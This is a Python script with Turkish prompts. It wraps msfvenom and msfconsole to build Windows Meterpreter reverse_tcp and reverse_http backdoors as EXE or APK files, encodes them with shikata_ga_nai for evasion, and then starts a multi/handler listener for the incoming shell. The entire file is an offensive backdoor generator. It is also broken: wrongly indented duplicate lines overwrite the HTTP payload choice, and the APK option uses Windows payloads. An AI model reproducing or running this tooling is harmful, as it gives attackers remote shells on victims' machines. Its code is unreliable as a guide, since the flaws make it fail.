import os
import subprocess

def msfconsole_dinle(payload, lhost, lport):
    msfconsole_command = f"msfconsole -q -x 'use multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit -z -j'"
    subprocess.run(msfconsole_command, shell=True)

def msfvenom_olustur():
    os.system("clear")
    os.system("figlet msfvenom moduluna hosgeldiniz")

    print("""
    1) Exe
    2) Apk
    """)

    uzanti_secim = int(input("Backdoor formatını seçin: "))

    if uzanti_secim == 1:
        uzanti = "-f exe"
        os.system("clear")
        print("""
        1) tcp
        2) http
        """)

        baglan_secim = int(input("Bağlanma seçeneğini seçin: "))
        if baglan_secim == 1:
            baglan_secenek = "-p windows/meterpreter/reverse_tcp"
            os.system("clear")
            # Kullanıcıdan IP adresini alın
            ip_adresi = input("Lütfen bir IP adresi girin: ")
            formatli_ip = "LHOST=" + ip_adresi
            print("Formatlanmış IP adresi: ", formatli_ip)
            # Kullanıcıdan port alın
            port_adresi = input("Lütfen bir port numarası girin: ")
            formatli_port = "LPORT=" + port_adresi
            print("Formatlanmış port adresi: ", formatli_port)
            # Kullanıcıdan çıktı al
            cikti=input("Lütfen cikti yerini ve dosya ismi belirtin(default=Bulunduğunuz dizin): ")
            os.system(f"msfvenom {baglan_secenek} -e x86/shikata_ga_nai -i 5 -a x86 --platform windows {formatli_ip} {formatli_port} {uzanti} > {cikti}")

            # msfconsole'da otomatik olarak dinleme başlat
            msfconsole_dinle("windows/meterpreter/reverse_tcp", ip_adresi, port_adresi)

        elif baglan_secim == 2:
            baglan_secenek = "-p windows/meterpreter/reverse_http"
                        baglan_secenek = "-p windows/meterpreter/reverse_tcp"
            os.system("clear")
            # Kullanıcıdan IP adresini alın
            ip_adresi = input("Lütfen bir IP adresi girin: ")
            formatli_ip = "LHOST=" + ip_adresi
            print("Formatlanmış IP adresi: ", formatli_ip)
            # Kullanıcıdan port alın
            port_adresi = input("Lütfen bir port numarası girin: ")
            formatli_port = "LPORT=" + port_adresi
            print("Formatlanmış port adresi: ", formatli_port)
            # Kullanıcıdan çıktı al
            cikti=input("Lütfen cikti yerini ve dosya ismi belirtin(default=Bulunduğunuz dizin): ")
            os.system(f"msfvenom {baglan_secenek} -e x86/shikata_ga_nai -i 5 -a x86 --platform windows {formatli_ip} {formatli_port} {uzanti} > {cikti}")
            msfconsole_dinle("windows/meterpreter/reverse_http", ip_adresi, port_adresi)
    elif uzanti_secim == 2:
        uzanti = "-f apk"
        os.system("clear")
        print("""
        1) tcp
        2) http
        """)

        baglan_secim = int(input("Bağlanma seçeneğini seçin: "))
        if baglan_secim == 1:
            baglan_secenek = "-p windows/meterpreter/reverse_tcp"
            os.system("clear")
            # Kullanıcıdan IP adresini alın
            ip_adresi = input("Lütfen bir IP adresi girin: ")
            formatli_ip = "LHOST=" + ip_adresi
            print("Formatlanmış IP adresi: ", formatli_ip)
            # Kullanıcıdan port alın
            port_adresi = input("Lütfen bir port numarası girin: ")
            formatli_port = "LPORT=" + port_adresi
            print("Formatlanmış port adresi: ", formatli_port)
            # Kullanıcıdan çıktı al
            cikti=input("Lütfen cikti yerini ve dosya ismi belirtin(default=Bulunduğunuz dizin): ")
            os.system(f"msfvenom {baglan_secenek} -e x86/shikata_ga_nai -i 5 -a x86 --platform windows {formatli_ip} {formatli_port} {uzanti} > {cikti}")

            # msfconsole'da otomatik olarak dinleme başlat
            msfconsole_dinle("windows/meterpreter/reverse_tcp", ip_adresi, port_adresi)

        elif baglan_secim == 2:
            baglan_secenek = "-p windows/meterpreter/reverse_http"
                        baglan_secenek = "-p windows/meterpreter/reverse_tcp"
            os.system("clear")
            # Kullanıcıdan IP adresini alın
            ip_adresi = input("Lütfen bir IP adresi girin: ")
            formatli_ip = "LHOST=" + ip_adresi
            print("Formatlanmış IP adresi: ", formatli_ip)
            # Kullanıcıdan port alın
            port_adresi = input("Lütfen bir port numarası girin: ")
            formatli_port = "LPORT=" + port_adresi
            print("Formatlanmış port adresi: ", formatli_port)
            # Kullanıcıdan çıktı al
            cikti=input("Lütfen cikti yerini ve dosya ismi belirtin(default=Bulunduğunuz dizin): ")
            os.system(f"msfvenom {baglan_secenek} -e x86/shikata_ga_nai -i 5 -a x86 --platform windows {formatli_ip} {formatli_port} {uzanti} > {cikti}")
            msfconsole_dinle("windows/meterpreter/reverse_http", ip_adresi, port_adresi)
        
    else:
        uzanti = "-f exe"
        print("Varsayılan olarak exe seçildi.")

msfvenom_olustur()
